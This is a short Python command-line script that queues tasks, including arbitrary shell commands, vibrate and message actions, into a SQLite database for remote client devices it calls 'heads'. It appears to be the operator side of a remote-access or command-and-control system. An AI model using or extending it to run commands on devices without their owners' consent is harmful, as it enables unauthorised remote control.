import sqlite3
import json
import sys

def send_command(client_id, action, payload):
    try:
        # Connect to the hydra database
        conn = sqlite3.connect('hydra_heads.db')
        cursor = conn.cursor()

        # Convert payload dict to JSON string
        payload_json = json.dumps(payload)

        # Insert the task into the queue
        cursor.execute('''
            INSERT INTO tasks (client_id, action, payload, status)
            VALUES (?, ?, ?, 'pending')
        ''', (client_id, action, payload_json))

        conn.commit()
        conn.close()
        print(f"[+] Task '{action}' successfully queued for {client_id}")
    
    except Exception as e:
        print(f"[-] Error queuing task: {e}")

if __name__ == "__main__":
    # Simple CLI logic for testing
    if len(sys.argv) < 3:
        print("Usage: python commander.py <client_id> <action> <data>")
        print("Example: python commander.py DESKTOP-HEAD-ALPHA shell \"uname -a\"")
        print("Example: python commander.py ANDROID-HEAD-01 vibrate 2000")
    else:
        target = sys.argv[1]
        cmd_type = sys.argv[2]
        
        if cmd_type == "shell":
            command_string = sys.argv[3]
            send_command(target, "shell", {"cmd": command_string})
        
        elif cmd_type == "vibrate":
            duration = int(sys.argv[3])
            send_command(target, "vibrate", {"duration": duration})
            
        elif cmd_type == "msg":
            message = sys.argv[3]
            send_command(target, "msg", {"content": message})
        
        else:
            print(f"[!] Unknown command type: {cmd_type}")